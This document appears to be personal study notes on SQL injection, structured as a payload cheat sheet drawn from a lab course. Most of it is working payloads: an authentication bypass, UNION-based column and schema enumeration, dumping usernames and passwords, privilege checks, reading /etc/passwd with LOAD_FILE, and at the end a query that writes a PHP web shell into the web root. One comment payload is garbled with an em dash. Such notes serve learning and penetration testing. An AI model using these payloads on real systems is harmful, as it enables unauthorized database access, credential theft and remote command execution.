# SQL Injections

# SQL Injections Payload

[PayloadsAllTheThings/SQL Injection at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

# **SQLi Discovery**

| Payload | URL Encoded |
| --- | --- |
| `'` | `%27` |
| `"` | `%22` |
| `#` | `%23` |
| `;` | `%3B` |
| `)` | `%29` |

# **OR Injection**

**Payload**

```sql
admin' or '1'='1
```

**The final query should be as follow:**

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

![image.png](SQL%20Injections%2013166046cc148077aa8ee70528dfedcc/image.png)

# **Comments**

```sql
mysql> SELECT username FROM logins; -- 
```

**Note:** In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.

The `#` symbol can be used as well.

**Note:** if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.

## **Comments to SQLi**

**Original Query**

```sql
SELECT * FROM logins WHERE username='<USERNAME>' AND password = '<PASSWORD>';
```

**Payload**

```sql
admin'— -
```

**Altered Query**

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

# **Union Injection**

## **Detect number of columns**

### **Using ORDER BY**

In SQL, `ORDER BY x` is used to sort the results of a query based on the x column selected in the list of columns.

```sql
' order by 1-- -   
' order by 2-- -   
' order by 3-- -
' order by 4-- -   #Unknown column '5' in 'order clause'.
```

**Note:** If it failed at `order by 4`, this means the table has three columns, which is the number of columns we were able to sort by successfully.

### **Using UNION**

```sql
cn' UNION select NULL-- -                 #The used SELECT statements have a different number of columns
cn' UNION select NULL,NULL-- -            #The used SELECT statements have a different number of columns
cn' UNION select NULL,NULL,NULL-- -        
cn' UNION select NULL,NULL,NULL,NULL-- -  #The used SELECT statements have a different number of columns
```

We get an error saying that the number of columns don’t match.

## **Location of Injection**

```sql
cn' UNION select 'a',NULL,NULL-- -
cn' UNION select NULL,'a',NULL-- -
cn' UNION select NULL,NULL,'a'-- -
```

In this case, the payload can be injected in column 2, 3.

# **Database Enumeration**

## **MySQL Fingerprinting**

 The following queries and their output will tell us that we are dealing with `MySQL`:

| Payload | When to Use | Expected Output | Wrong Output |
| --- | --- | --- | --- |
| `SELECT @@version` | When we have full query output | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`' | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)` | When we only have numeric output | `1` | Error with other DBMS |
| `SELECT SLEEP(5)` | Blind/No Output | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS |

## Database, Tables and Column Enumeration

> The INFORMATION_SCHEMA database contains metadata about the databases and tables present on the server.
> 

> The table SCHEMATA in the `INFORMATION_SCHEMA` database contains information about all databases on the server. It is used to obtain database names so we can then query them.
> 

> The `SCHEMA_NAME` column contains all the database names currently present.
> 

**Payload**

```sql
cn' UNION select NULL,'a',NULL-- -
```

**Enumerating database**

```sql
cn' UNION select NULL,schema_name,NULL from INFORMATION_SCHEMA.SCHEMATA-- -
```

**Find out which database the web application is running**

```sql
cn' UNION select NULL,database(),NULL from INFORMATION_SCHEMA.SCHEMATA-- -
```

**TABLES**

```sql
cn' UNION select NULL,TABLE_NAME,TABLE_SCHEMA,NULL from INFORMATION_SCHEMA.TABLES where table_schema='<DATABASE_NAME>'-- -
```

**Note: W**e added a (where table_schema='') condition to only return tables from the specified' database, otherwise we would get all tables in all databases, which can be many.

**COLUMNS**

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<TABLE_NAME>'-- -
```

**DATA**

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

In this case, it specifies dev.credentials (database.table). This is because the application is not querying information from that database, so it needs to be specify

## **Privileges**

### **DB User**

To be able to find our current DB user, we can use any of the following queries:

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

### **User Privileges**

```sql
SELECT super_priv FROM mysql.user
```

**UNION payload example**

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

If the query returns `Y`, it means `YES`, indicating superuser privileges. 

**Check more privileges**

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

![image.png](SQL%20Injections%2013166046cc148077aa8ee70528dfedcc/image%201.png)

### **LOAD_FILE**

```sql
SELECT LOAD_FILE('/etc/passwd');
```

**UNION payload example**

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

**Another Example**

In this example know that the current page is `search.php`. The default Apache webroot is `/var/www/html`. Let us try reading the source code of the file at `/var/www/html/search.php`.

 **HTML source:**

![image.png](SQL%20Injections%2013166046cc148077aa8ee70528dfedcc/image%202.png)

### **Write File Privileges**

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled (showed previously).
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

**secure_file_priv**

An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, `NULL` means we cannot read/write from any directory.

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

**UNION payload example**

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

**SELECT INTO OUTFILE**

The SELECT INTO OUTFILE statement can be used to write data from select queries into files. This is usually used for exporting data from tables.

**Example**

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';    #COPY users Table content to /tmp/credentials

SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';   #COPY string into a file

```

**Note:** Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.

## **Writing a Web Shell**

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
